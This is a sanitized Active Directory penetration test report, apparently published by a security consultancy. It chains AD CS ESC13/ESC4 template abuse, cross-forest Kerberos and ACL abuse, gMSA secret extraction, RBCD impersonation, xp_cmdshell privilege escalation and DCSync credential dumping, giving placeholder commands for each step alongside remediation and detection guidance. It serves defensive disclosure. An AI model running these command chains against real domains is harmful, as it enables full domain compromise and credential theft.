<div align="center">

# Active Directory Cross-Forest Compromise Assessment

<img src="https://img.shields.io/badge/Severity-Critical-red?style=for-the-badge" alt="Critical"/>
<img src="https://img.shields.io/badge/CVSS-9.8-red?style=for-the-badge" alt="CVSS 9.8"/>
<img src="https://img.shields.io/badge/Environment-Internal_AD-blue?style=for-the-badge" alt="Internal AD"/>
<img src="https://img.shields.io/badge/Focus-ADCS%20%7C%20Kerberos%20%7C%20RBCD-purple?style=for-the-badge" alt="Focus"/>

**AMN SECURITY**  
*Offensive Security Consultancy*

</div>

---

## Executive Summary

AMN SECURITY performed an internal Active Directory penetration test against a segmented enterprise environment containing two trusted Windows domains. The assessment demonstrated a complete compromise path from a low-privileged domain user to full domain administrator access by chaining certificate services misconfigurations, cross-forest Kerberos trust abuse, group-managed service account exposure, resource-based constrained delegation, and SQL Server local privilege escalation.

All client identifiers, hostnames, IP addresses, usernames, passwords, hashes, keys, and file names in this public report have been sanitized. The technical sequence, risk conditions, and defensive recommendations remain accurate for real-world remediation.

| Item | Value |
|---|---|
| Assessment Type | Internal Active Directory Penetration Test |
| Environment | Segmented Windows Enterprise Network |
| Impact | Full compromise of Domain A and Domain B |
| Initial Access Level | Standard authenticated domain user |
| Final Access Level | Domain Administrator |
| Severity | Critical |
| CVSS v3.1 | 9.8 |
| Methodology | PTES, MITRE ATT&CK, ADCS ESC mapping, manual Kerberos abuse validation |

---

## Scope Overview

The assessed environment contained two Active Directory domains connected by a trust relationship:

| Sanitized Asset | Description |
|---|---|
| `dc-a01.corp.local` | Domain controller and AD CS server for Domain A |
| `dc-b01.trust.local` | Domain controller and SQL Server host for Domain B |
| Domain A | Primary corporate identity domain |
| Domain B | Trusted subsidiary/partner domain |
| AD CS | Enterprise CA with vulnerable templates |
| SQL Server | Domain-integrated MSSQL instance running under a service account |

Network segmentation was present, but authenticated access to Domain A allowed pivoting into Domain B after route discovery and tunnel establishment.

---

## Attack Path Overview

```text
Low-privileged user
        |
        v
AD CS ESC13 certificate issuance policy abuse
        |
        v
WinRM access through certificate-derived group membership
        |
        v
Internal pivot to trusted domain
        |
        v
Cross-forest Kerberos + ACL abuse against gMSA management group
        |
        v
gMSA password material extraction
        |
        v
Restricted PowerShell endpoint access and credential disclosure
        |
        v
User-level access in trusted domain
        |
        v
RBCD to SQL service account + S4U impersonation
        |
        v
MSSQL xp_cmdshell as SQL service identity
        |
        v
SeImpersonatePrivilege -> local SYSTEM via potato-class exploit
        |
        v
Local administrator on trusted DC
        |
        v
Credential dumping and cross-forest return path
        |
        v
AD CS ESC4 template takeover
        |
        v
Administrator certificate issuance
        |
        v
Domain Administrator compromise
```

---

## Key Findings

### 1. AD CS ESC13 - Issuance Policy Linked to Privileged Access Group

**Severity:** Critical  
**Affected Area:** Domain A AD CS  
**Impact:** Authenticated users could request a certificate from a template whose issuance policy mapped the requester into a privileged group used for remote management.

The assessment identified a certificate template configured for client authentication and linked to an issuance policy associated with a remote management access group. A standard user could enroll in the template and obtain certificate-based access to management services.

**Sanitized validation:**

```bash
certipy find -k -dc-ip <DC_A_IP> -target dc-a01.corp.local -vulnerable -stdout
certipy req -u '<USER>@corp.local' -p '<PASSWORD>' \
  -dc-ip <DC_A_IP> -target dc-a01.corp.local \
  -ca '<CA_NAME>' -template '<TEMP_REMOTE_TEMPLATE>' -k
certipy auth -pfx '<USER>.pfx' -dc-ip <DC_A_IP>
```

**Observed result:** the account received effective WinRM access through certificate-derived group membership.

---

### 2. Cross-Forest Kerberos Trust Abuse Enabled LDAP Operations in Trusted Domain

**Severity:** High  
**Affected Area:** Domain trust boundary  
**Impact:** A Domain A identity could obtain service tickets for Domain B LDAP and perform privileged object manipulation due to delegated rights.

After the initial foothold, Kerberos cross-realm tickets were requested for services in Domain B. The user had an attack path to a gMSA management group in the trusted domain.

**Sanitized validation:**

```bash
export KRB5CCNAME=<USER>.ccache
kvno krbtgt/trust.local
kvno ldap/dc-b01.trust.local
bloodyAD -d trust.local -u '<USER>' --host dc-b01.trust.local \
  --dc-ip <DC_B_IP> -k get object '<TARGET_GROUP>' --attr distinguishedName,groupType
```

---

### 3. gMSA Management Group Abuse Exposed Managed Service Account Secrets

**Severity:** Critical  
**Affected Area:** Domain B identity management  
**Impact:** Attackers could add themselves to a group allowed to read gMSA password material.

The trusted-domain group controlling gMSA readers was modifiable through an ACL path. After adding the foreign security principal to the group and refreshing Kerberos tickets, the gMSA password material was retrievable.

**Sanitized validation:**

```bash
bloodyAD --host dc-b01.trust.local -d trust.local --dc-ip <DC_B_IP> \
  -u '<USER>' -k add genericAll '<GMSA_MANAGERS_DN>' '<USER_SID>'

bloodyAD -d trust.local -u '<USER>' --host dc-b01.trust.local \
  --dc-ip <DC_B_IP> -k add groupMember '<GMSA_MANAGERS_DN>' '<USER_SID>'

ldeep ldap -k -s ldap://dc-b01.trust.local -d TRUST.LOCAL gmsa
```

**Observed result:** AES key material for the managed service account was obtained and used to request a TGT.

---

### 4. Restricted PowerShell Endpoint Leaked Privileged Credentials

**Severity:** High  
**Affected Area:** Endpoint hardening and operator hygiene  
**Impact:** Historical PowerShell commands exposed reusable credentials for a trusted-domain user.

Using the gMSA Kerberos context, a restricted PowerShell endpoint was accessible. The endpoint constrained available commands, but script block invocation allowed reading command history. The history contained a PSCredential creation command with a plaintext password.

**Sanitized validation:**

```powershell
&{cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine}
&{(Get-Content 'ConsoleHost_history.txt') -join "`n"}
```

**Observed result:** credentials for a remote management user in Domain B were recovered.

---

### 5. RBCD to SQL Service Account Enabled MSSQL Impersonation

**Severity:** Critical  
**Affected Area:** Kerberos delegation and SQL Server  
**Impact:** The gMSA could impersonate a SQL-privileged user to the MSSQL SPN.

The recovered Domain B user had rights to configure resource-based constrained delegation on a SQL service account. This allowed the gMSA to impersonate a SQL administrator principal to the MSSQL service.

**Sanitized validation:**

```bash
bloodyAD --host dc-b01.trust.local -d trust.local -u '<TRUST_USER>' \
  -k add rbcd '<SQL_SERVICE_ACCOUNT>' '<GMSA_ACCOUNT>$'

getST.py -spn 'mssqlsvc/dc-b01.trust.local' \
  -impersonate '<SQL_ADMIN_USER>' \
  -dc-ip <DC_B_IP> trust.local/'<GMSA_ACCOUNT>$' -aesKey '<GMSA_AES_KEY>'

mssqlclient.py trust.local/'<SQL_ADMIN_USER>'@dc-b01.trust.local -k -no-pass
```

---

### 6. SQL Server Service Account Had SeImpersonatePrivilege

**Severity:** Critical  
**Affected Area:** SQL Server host privilege boundary  
**Impact:** Command execution through SQL Server was elevated to local SYSTEM.

`xp_cmdshell` executed as the SQL service identity. The identity had `SeImpersonatePrivilege`, enabling local privilege escalation with a potato-class named-pipe impersonation technique. Local administrator membership was granted to the recovered Domain B user.

**Sanitized validation:**

```sql
EXEC xp_cmdshell 'whoami /priv';
EXEC xp_cmdshell 'C:\Path\To\PrivilegeEscalation.exe -cmd "net localgroup administrators /add <TRUST_USER>"';
```

**Observed result:** the recovered Domain B user became a local administrator on the Domain B controller/SQL host.

---

### 7. Domain Credential Dumping Exposed Cross-Forest Escalation Material

**Severity:** Critical  
**Affected Area:** Domain B credential security  
**Impact:** Local administrator access enabled extraction of domain secrets, including a user with escalation rights into Domain A.

After local administrator access was achieved on the Domain B controller, directory replication techniques were used to extract selected credential material. A Domain B principal possessed cross-forest rights relevant to Domain A certificate template control.

**Sanitized validation:**

```bash
secretsdump.py trust.local/'<TRUST_USER>:<PASSWORD>'@dc-b01.trust.local -k -just-dc-user '<CROSS_FOREST_USER>'
getTGT.py trust.local/'<CROSS_FOREST_USER>' -aesKey '<AES256_KEY>' -dc-ip <DC_B_IP>
kvno ldap/dc-a01.corp.local@CORP.LOCAL
```

---

### 8. AD CS ESC4 - Certificate Template Takeover

**Severity:** Critical  
**Affected Area:** Domain A AD CS template permissions  
**Impact:** The attacker could modify a certificate template to allow arbitrary SAN UPN/SID enrollment and request a certificate as the domain administrator.

The cross-forest principal had sufficient rights to modify an AD CS certificate template. The template was reconfigured to enable client authentication, remove manager approval/signature requirements, and allow subject alternative name control.

**Sanitized validation:**

```bash
TEMPLATE_DN='CN=<SMARTCARD_TEMPLATE>,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local'

bloodyAD --host dc-a01.corp.local -d CORP.LOCAL --kerberos \
  add genericAll "$TEMPLATE_DN" 'Domain Users'

bloodyAD --host dc-a01.corp.local -d CORP.LOCAL --kerberos \
  set object "$TEMPLATE_DN" msPKI-Certificate-Name-Flag -v 1

bloodyAD --host dc-a01.corp.local -d CORP.LOCAL --kerberos \
  set object "$TEMPLATE_DN" msPKI-Enrollment-Flag -v 0

bloodyAD --host dc-a01.corp.local -d CORP.LOCAL --kerberos \
  set object "$TEMPLATE_DN" pKIExtendedKeyUsage -v '1.3.6.1.5.5.7.3.2'

bloodyAD --host dc-a01.corp.local -d CORP.LOCAL --kerberos \
  set object "$TEMPLATE_DN" msPKI-Certificate-Application-Policy -v '1.3.6.1.5.5.7.3.2'

bloodyAD --host dc-a01.corp.local -d CORP.LOCAL --kerberos \
  set object "$TEMPLATE_DN" msPKI-RA-Signature -v 0
```

After template modification, a certificate was requested for the Domain A administrator identity.

```bash
certipy req -k -u '<USER>@corp.local' -pfx '<USER>.pfx' \
  -target dc-a01.corp.local -dc-host dc-a01.corp.local -dc-ip <DC_A_IP> \
  -ca '<CA_NAME>' -template '<SMARTCARD_TEMPLATE>' \
  -upn Administrator@corp.local -sid '<DOMAIN_ADMIN_SID>'

certipy auth -pfx administrator.pfx -dc-ip <DC_A_IP> \
  -username Administrator -domain corp.local
```

**Observed result:** a valid Kerberos TGT and NT hash were obtained for the Domain A administrator account.

---

## Impact

A low-privileged user achieved complete compromise of two trusted Active Directory domains. The attack path provided:

- Remote management access to Domain A systems.
- Pivoting into a segmented trusted domain.
- Read access to gMSA password material.
- Recovery of reusable plaintext credentials from PowerShell history.
- SQL Server command execution.
- Local SYSTEM execution through impersonation privilege abuse.
- Local administrator access to a domain controller/SQL host.
- Selective credential dumping.
- Certificate template takeover.
- Domain Administrator authentication through forged certificate enrollment.

---

## MITRE ATT&CK Mapping

| Technique | ID | Usage |
|---|---:|---|
| Valid Accounts | T1078 | Initial domain user access and recovered trusted-domain credentials |
| Account Discovery | T1087 | LDAP and BloodHound-style enumeration |
| Remote Services: WinRM | T1021.006 | Remote management access through certificate-derived privileges |
| Steal or Forge Kerberos Tickets | T1558 | Cross-realm tickets, S4U, certificate-derived TGTs |
| Unsecured Credentials | T1552 | PowerShell history exposed credentials |
| Exploitation for Privilege Escalation | T1068 | Potato-class impersonation to SYSTEM |
| OS Credential Dumping: DCSync | T1003.006 | Directory replication credential extraction |
| Abuse Elevation Control Mechanism | T1548 | Local admin addition after SYSTEM execution |
| Active Directory Certificate Services Abuse | N/A | ESC13 and ESC4 certificate attack paths |

---

## Root Cause Analysis

The compromise was not caused by a single vulnerability. It resulted from a chain of identity-control weaknesses:

1. Certificate templates granted enrollment to overly broad principals.
2. Issuance policies were linked to privileged authorization groups.
3. Cross-forest trust permissions were not reviewed for unintended privilege paths.
4. gMSA reader groups were modifiable by accounts outside their intended administrative boundary.
5. PowerShell history was not controlled on privileged/restricted endpoints.
6. SQL Server service accounts retained impersonation privileges and were reachable from pivoted network paths.
7. AD CS certificate templates allowed unsafe modification by non-CA administrators.

---

## Remediation Recommendations

### Immediate Actions

- Disable or restrict the vulnerable AD CS templates until permissions are reviewed.
- Remove broad enrollment rights from templates that include client authentication EKUs.
- Audit issuance policies linked to security groups and remove privilege-bearing group mappings.
- Remove unauthorized members and foreign security principals from gMSA reader/manager groups.
- Rotate exposed user credentials and all affected gMSA passwords.
- Disable `xp_cmdshell` unless explicitly required and monitored.
- Remove local administrator additions created during the assessment.
- Review and reset credentials for accounts exposed through directory replication.

### AD CS Hardening

- Review all templates for ESC1-ESC15 style misconfigurations.
- Restrict template modification rights to dedicated PKI administrators.
- Require manager approval or authorized signatures for high-impact templates.
- Prevent enrollee-supplied SAN unless required by a documented business process.
- Monitor certificate requests containing privileged UPNs or administrator SIDs.
- Enable CA event auditing and forward events to SIEM.

### Kerberos and Trust Controls

- Review all cross-forest trust relationships and SID filtering settings.
- Audit foreign security principals in privileged groups.
- Monitor unusual cross-realm service ticket requests.
- Enforce least privilege for ACLs that control groups, service accounts, and delegation settings.

### gMSA Controls

- Limit `PrincipalsAllowedToRetrieveManagedPassword` to tightly scoped groups.
- Monitor reads of `msDS-ManagedPassword` and changes to gMSA reader groups.
- Treat gMSA AES keys as high-value secrets equivalent to service account passwords.

### SQL Server Controls

- Run SQL Server services under least-privilege identities.
- Remove unnecessary local privileges from service accounts.
- Disable `xp_cmdshell` and alert on enablement events.
- Segment SQL services away from domain controllers where possible.

### Endpoint Controls

- Disable persistent PowerShell history for sensitive accounts and restricted endpoints.
- Clear historical PSReadLine files after credential exposure.
- Deploy PowerShell transcription and script block logging with secure forwarding.
- Prohibit plaintext credentials in command history, scripts, and operational notes.

---

## Detection Opportunities

| Detection Area | Signal |
|---|---|
| AD CS | Certificate enrollment for privileged UPN/SID combinations |
| AD CS | Template modifications to EKU, SAN, enrollment flags, or manager approval settings |
| Kerberos | Cross-realm TGS requests from unusual principals |
| LDAP | Writes to `groupType`, `member`, `nTSecurityDescriptor`, and RBCD attributes |
| gMSA | Reads of managed password material by newly added principals |
| SQL Server | `xp_cmdshell` enablement and suspicious command execution |
| Windows | Local group membership changes on domain controllers |
| Endpoint | Access to PSReadLine history files by service accounts |

---

## Arabic Summary

## الملخص العربي

نفذت AMN SECURITY اختبار اختراق داخلي على بيئة Active Directory تحتوي على نطاقين موثوقين. أظهر الاختبار إمكانية الانتقال من مستخدم منخفض الصلاحيات إلى سيطرة كاملة على النطاقين عبر سلسلة مترابطة من سوء إعدادات AD CS وKerberos وgMSA وRBCD وMSSQL.

أهم نقاط الخطر كانت:

- قالب شهادة يسمح بالوصول الإداري عبر `ESC13`.
- صلاحيات Cross-Forest غير مضبوطة سمحت بالتحكم بمجموعة مسؤولة عن gMSA.
- إمكانية استخراج مفاتيح gMSA واستخدامها للحصول على تذاكر Kerberos.
- وجود كلمة مرور داخل PowerShell history.
- إساءة استخدام RBCD للوصول إلى MSSQL كحساب عالي الصلاحية.
- استخدام `xp_cmdshell` وحساب خدمة يمتلك `SeImpersonatePrivilege` للوصول إلى SYSTEM.
- استخراج مواد اعتماد من النطاق الموثوق.
- السيطرة على قالب شهادة عبر `ESC4` وإصدار شهادة لحساب Administrator.

التوصية الأساسية هي التعامل مع AD CS كجزء حساس من Tier 0، ومراجعة كل القوالب والصلاحيات والعلاقات العابرة بين النطاقات، لأن أي خطأ في هذه الطبقة قد يؤدي إلى اختراق كامل للنطاق.

---

## Legal and Ethical Notice

This publication is a sanitized case study derived from an authorized security assessment. It is provided for defensive education, detection engineering, and remediation planning. No real client identifiers, secrets, flags, or infrastructure values are disclosed.

Unauthorized use of the techniques described here is illegal. Always obtain written authorization before performing security testing.

---

<div align="center">

**AMN SECURITY**  
*Offensive Security Consultancy*  
Iraq — Clients Worldwide

<a href="https://amn.amnoffsec.workers.dev/">Website</a> •
<a href="mailto:ayman.mahmoudoffsec@gmail.com">Email</a> •
<a href="https://www.instagram.com/ixctw?">Instagram</a>

© 2026 AMN SECURITY. All rights reserved.

</div>
